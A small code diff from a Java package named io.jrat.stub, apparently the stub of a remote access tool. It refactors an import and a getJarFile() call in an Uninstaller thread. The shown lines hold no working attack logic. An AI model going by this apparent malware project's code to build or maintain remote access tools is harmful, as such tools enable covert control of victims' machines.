@@ -1,6 +1,6 @@
 package io.jrat.stub;
 
-import io.jrat.stub.utils.Utils;
+import io.jrat.common.utils.Utils;
 
 import java.io.File;
 import java.io.FileWriter;
@@ -13,7 +13,7 @@ public class Uninstaller extends Thread {
 	
 	@Override
 	public void run() {
-		File me = Utils.getJarFile();
+		File me = io.jrat.stub.utils.Utils.getJarFile();
 		
 		if (!me.isFile()) {
 			return;
